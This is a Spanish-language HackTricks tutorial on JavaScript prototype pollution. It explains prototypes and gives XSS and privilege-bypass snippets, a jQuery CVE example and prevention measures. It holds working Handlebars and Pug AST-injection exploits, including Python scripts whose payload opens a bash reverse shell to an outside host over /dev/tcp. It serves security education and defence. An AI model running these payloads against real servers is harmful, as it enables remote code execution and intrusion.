# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Objetos en JavaScript <a href="#id-053a" id="id-053a"></a>

Los objetos en JavaScript son esencialmente colecciones de pares clave-valor, conocidos como propiedades. Un objeto puede crearse utilizando `Object.create` con `null` como argumento para producir un objeto vac√≠o. Este m√©todo permite la creaci√≥n de un objeto sin ninguna propiedad heredada.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Un objeto vac√≠o es similar a un diccionario vac√≠o, representado como `{}`.

### Funciones y Clases en JavaScript

En JavaScript, las clases y las funciones est√°n estrechamente vinculadas, con las funciones a menudo sirviendo como constructores para las clases. A pesar de la falta de soporte nativo de clases en JavaScript, los constructores pueden emular el comportamiento de una clase.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipos en JavaScript

JavaScript permite la modificaci√≥n, adici√≥n o eliminaci√≥n de atributos de prototipo en tiempo de ejecuci√≥n. Esta flexibilidad permite la extensi√≥n din√°mica de las funcionalidades de una clase.

Funciones como `toString` y `valueOf` pueden ser alteradas para cambiar su comportamiento, demostrando la naturaleza adaptable del sistema de prototipos de JavaScript.

## Herencia

En la programaci√≥n basada en prototipos, las propiedades/m√©todos son heredados por objetos de clases. Estas clases se crean a√±adiendo propiedades/m√©todos a una instancia de otra clase o a un objeto vac√≠o.

Cabe destacar que cuando se a√±ade una propiedad a un objeto que sirve como prototipo para otros objetos (como `myPersonObj`), los objetos que heredan obtienen acceso a esta nueva propiedad. Sin embargo, esta propiedad no se muestra autom√°ticamente a menos que se invoque expl√≠citamente.

## Contaminaci√≥n de \_\_proto\_\_ <a href="#id-0d0a" id="id-0d0a"></a>

## Explorando la Contaminaci√≥n de Prototipos en JavaScript

Los objetos de JavaScript est√°n definidos por pares clave-valor y heredan del prototipo de objeto de JavaScript. Esto significa que alterar el prototipo de Object puede influir en todos los objetos en el entorno.

Vamos a usar un ejemplo diferente para ilustrar:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
El acceso al prototipo de Object es posible a trav√©s de:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Al agregar propiedades al prototipo Object, todos los objetos de JavaScript heredar√°n estas nuevas propiedades:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## contaminaci√≥n de prototipos

Para un escenario donde el uso de `__proto__` est√° restringido, modificar el prototipo de una funci√≥n es una alternativa:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Esto afecta solo a los objetos creados a partir del constructor `Vehicle`, d√°ndoles las propiedades `beep`, `hasWheels`, `honk` e `isElectric`.

Dos m√©todos para afectar globalmente a los objetos JavaScript a trav√©s de la contaminaci√≥n del prototipo incluyen:

1. Contaminando directamente el `Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Contaminando el prototipo de un constructor para una estructura com√∫nmente utilizada:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Despu√©s de estas operaciones, cada objeto JavaScript puede ejecutar los m√©todos `goodbye` y `greet`.

## Contaminando otros objetos

### De una clase a Object.prototype

En un escenario donde puedes **contaminar un objeto espec√≠fico** y necesitas **llegar a `Object.prototype`** puedes buscarlo con algo similar al siguiente c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Contaminaci√≥n de elementos de un array

Tenga en cuenta que al igual que puede contaminar atributos de objetos en JS, si tiene acceso para contaminar un array, tambi√©n puede **contaminar los valores del array** accesibles **por √≠ndices** (tenga en cuenta que no puede sobrescribir valores, por lo que necesita contaminar √≠ndices que de alguna manera se utilicen pero no se escriban).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Contaminaci√≥n de elementos Html

Al generar un elemento HTML a trav√©s de JS, es posible **sobrescribir** el atributo **`innerHTML`** para hacer que escriba **c√≥digo HTML arbitrario**. [Idea y ejemplo de este informe](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ejemplos

### Ejemplo B√°sico

Una contaminaci√≥n de prototipo ocurre debido a una falla en la aplicaci√≥n que permite sobrescribir propiedades en `Object.prototype`. Esto significa que dado que la mayor√≠a de los objetos derivan sus propiedades de `Object.prototype`

El ejemplo m√°s sencillo es agregar un valor a un **atributo no definido de un objeto** que va a ser verificado, como:
```javascript
if (user.admin) {
```
Si el atributo **`admin` est√° sin definir**, es posible abusar de una PP y establecerlo en Verdadero con algo como:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
El mecanismo detr√°s de esto implica manipular propiedades de tal manera que si un atacante tiene control sobre ciertas entradas, pueden modificar el prototipo de todos los objetos en la aplicaci√≥n. Esta manipulaci√≥n t√≠picamente implica establecer la propiedad `__proto__`, que, en JavaScript, es sin√≥nimo de modificar directamente el prototipo de un objeto.

Las condiciones bajo las cuales este ataque puede ejecutarse con √©xito, como se describe en un [estudio](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) espec√≠fico, incluyen:

* Realizar una fusi√≥n recursiva.
* Definir propiedades basadas en una ruta.
* Clonar objetos.

### Funci√≥n de anulaci√≥n
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Contaminaci√≥n de Prototipos a RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Otros payloads:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Contaminaci√≥n de prototipos del lado del cliente a XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de contaminaci√≥n de prototipos a trav√©s de jQuery $ .extend

[Para m√°s detalles, consulta este art√≠culo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) En jQuery, la funci√≥n `$ .extend` puede llevar a la contaminaci√≥n de prototipos si se utiliza incorrectamente la funci√≥n de copia profunda. Esta funci√≥n se usa com√∫nmente para clonar objetos o fusionar propiedades de un objeto predeterminado. Sin embargo, cuando est√° mal configurada, las propiedades destinadas a un nuevo objeto pueden asignarse al prototipo en su lugar. Por ejemplo:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Esta vulnerabilidad, identificada como CVE-2019‚Äì11358, ilustra c√≥mo una copia profunda puede modificar inadvertidamente el prototipo, lo que lleva a posibles riesgos de seguridad, como acceso de administrador no autorizado si propiedades como `isAdmin` se verifican sin una verificaci√≥n de existencia adecuada.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de poluci√≥n de prototipos a trav√©s de lodash

[Para m√°s detalles consulta este art√≠culo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) encontr√≥ vulnerabilidades similares de poluci√≥n de prototipos (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Estos problemas se abordaron en la versi√≥n 4.17.11.

### Otro tutorial con CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Herramientas para detectar la Poluci√≥n de Prototipos

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Extensi√≥n de Burp Suite dise√±ada para detectar y analizar vulnerabilidades de poluci√≥n de prototipos en el lado del servidor en aplicaciones web. Esta herramienta automatiza el proceso de escaneo de solicitudes para identificar posibles problemas de poluci√≥n de prototipos. Explota gadgets conocidos, m√©todos para aprovechar la poluci√≥n de prototipos para ejecutar acciones da√±inas, centr√°ndose particularmente en las bibliotecas de Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Esta extensi√≥n identifica vulnerabilidades de poluci√≥n de prototipos en el lado del servidor. Utiliza t√©cnicas descritas en la [poluci√≥n de prototipos en el lado del servidor](https://portswigger.net/research/server-side-prototype-pollution).

### Poluci√≥n de Prototipos AST en NodeJS

NodeJS utiliza extensamente √Årboles de Sintaxis Abstracta (AST) en JavaScript para funcionalidades como motores de plantillas y TypeScript. Esta secci√≥n explora las vulnerabilidades relacionadas con la poluci√≥n de prototipos en motores de plantillas, espec√≠ficamente Handlebars y Pug.

#### An√°lisis de Vulnerabilidad de Handlebars

El motor de plantillas Handlebars es susceptible a un ataque de poluci√≥n de prototipos. Esta vulnerabilidad surge de funciones espec√≠ficas dentro del archivo `javascript-compiler.js`. La funci√≥n `appendContent`, por ejemplo, concatena `pendingContent` si est√° presente, mientras que la funci√≥n `pushSource` restablece `pendingContent` a `undefined` despu√©s de agregar la fuente.

**Proceso de Explotaci√≥n**

La explotaci√≥n aprovecha el AST (√Årbol de Sintaxis Abstracta) producido por Handlebars, siguiendo estos pasos:

1. **Manipulaci√≥n del Analizador**: Inicialmente, el analizador, a trav√©s del nodo `NumberLiteral`, obliga a que los valores sean num√©ricos. La poluci√≥n de prototipos puede eludir esto, permitiendo la inserci√≥n de cadenas no num√©ricas.
2. **Manejo por el Compilador**: El compilador puede procesar un Objeto AST o una plantilla de cadena. Si `input.type` es igual a `Program`, la entrada se trata como preanalizada, lo que puede ser explotado.
3. **Inyecci√≥n de C√≥digo**: A trav√©s de la manipulaci√≥n de `Object.prototype`, se puede inyectar c√≥digo arbitrario en la funci√≥n de plantilla, lo que puede llevar a la ejecuci√≥n remota de c√≥digo.

Un ejemplo que demuestra la explotaci√≥n de la vulnerabilidad de Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Este c√≥digo muestra c√≥mo un atacante podr√≠a inyectar c√≥digo arbitrario en una plantilla de Handlebars.

**Referencia Externa**: Se encontr√≥ un problema relacionado con la contaminaci√≥n de prototipos en la biblioteca 'flat', como se detalla aqu√≠: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**Referencia Externa**: [Problema relacionado con la contaminaci√≥n de prototipos en la biblioteca 'flat'](https://github.com/hughsk/flat/issues/105)

Ejemplo de explotaci√≥n de contaminaci√≥n de prototipos en Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilidad de Pug

Pug, otro motor de plantillas, enfrenta un riesgo similar de contaminaci√≥n de prototipos. La informaci√≥n detallada est√° disponible en la discusi√≥n sobre [Inyecci√≥n AST en Pug](https://blog.p6.is/AST-Injection/#Pug).

Ejemplo de contaminaci√≥n de prototipos en Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Medidas Preventivas

Para reducir el riesgo de la contaminaci√≥n del prototipo, se pueden emplear las estrategias enumeradas a continuaci√≥n:

1. **Inmutabilidad de Objetos**: El `Object.prototype` puede hacerse inmutable aplicando `Object.freeze`.
2. **Validaci√≥n de Entradas**: Las entradas JSON deben ser rigurosamente validadas contra el esquema de la aplicaci√≥n.
3. **Funciones de Fusi√≥n Seguras**: Se debe evitar el uso inseguro de funciones de fusi√≥n recursivas.
4. **Objetos sin Prototipo**: Se pueden crear objetos sin propiedades de prototipo utilizando `Object.create(null)`.
5. **Uso de Mapas**: En lugar de `Object`, se debe usar `Map` para almacenar pares clave-valor.
6. **Actualizaciones de Bibliotecas**: Se pueden incorporar parches de seguridad actualizando regularmente las bibliotecas.
7. **Herramientas de Linter y An√°lisis Est√°tico**: Utilice herramientas como ESLint con complementos apropiados para detectar y prevenir vulnerabilidades de contaminaci√≥n del prototipo.
8. **Revisiones de C√≥digo**: Implemente revisiones de c√≥digo exhaustivas para identificar y remediar posibles riesgos relacionados con la contaminaci√≥n del prototipo.
9. **Formaci√≥n en Seguridad**: Eduque a los desarrolladores sobre los riesgos de la contaminaci√≥n del prototipo y las mejores pr√°cticas para escribir c√≥digo seguro.
10. **Uso Cauteloso de Bibliotecas**: Sea cauteloso al usar bibliotecas de terceros. Eval√∫e su postura de seguridad y revise su c√≥digo, especialmente aquellos que manipulan objetos.
11. **Protecci√≥n en Tiempo de Ejecuci√≥n**: Emplee mecanismos de protecci√≥n en tiempo de ejecuci√≥n, como el uso de paquetes npm centrados en la seguridad que pueden detectar y prevenir ataques de contaminaci√≥n del prototipo.

## Referencias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
